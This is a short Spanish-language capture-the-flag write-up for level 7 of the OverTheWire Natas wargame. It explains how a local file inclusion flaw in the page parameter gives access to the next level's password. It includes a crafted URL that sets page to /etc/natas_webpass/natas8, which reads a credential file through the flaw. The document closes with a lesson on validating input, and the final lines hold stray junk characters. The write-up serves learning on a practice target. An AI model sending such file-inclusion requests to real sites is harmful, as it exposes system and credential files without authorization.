La página inicial nos muestra dos enlaces `Home` y `About`.
Al dar clic en cada uno de ellos se actualiza la página:
- Al dar clic en `Home`
```
URL: http://natas7.natas.labs.overthewire.org/index.php?page=home

Texto:
this is the front page
```
- Al dar clic en `About`
```
URL: http://natas7.natas.labs.overthewire.org/index.php?page=about

Texto:
this is the about page
```

También encontramos una pista comentada en el código fuente de la página:
```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
*Es una nota recordándonos que cada nivel contiene la contraseña del nivel siguiente en una ruta  /etc/natas_webpass/*

Deducimos que el directorio tiene esta distribución:
```
☁ natas7.natas.labs.overthewire.org/
├── 📂 etc/natas_webpass/
|   └── natas8 # Contraseña del nivel siguiente
└── index.php # La página del nivel
```

Intentamos ingresar modificando la URL pero no resulta, comparando las URL de `home` y `about`, notamos que entre ellas cambia el valor del campo `page=`, así que lo modificamos para apuntar al archivo de la contraseña:
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

*Esto nos muestra la contraseña siguiente*

---
## **Conclusión**

Este nivel nos muestra los riesgos de la inclusión dinámica de archivos sin validar las entradas del usuario. Al permitir que el parámetro `page` se modifique en la URL, el sistema se vuelve vulnerable a ataques de **inclusión de archivos locales (LFI)**, donde se puede acceder a archivos del sistema que no deberían estar disponibles a través de la web. 

---
-,"  
[_P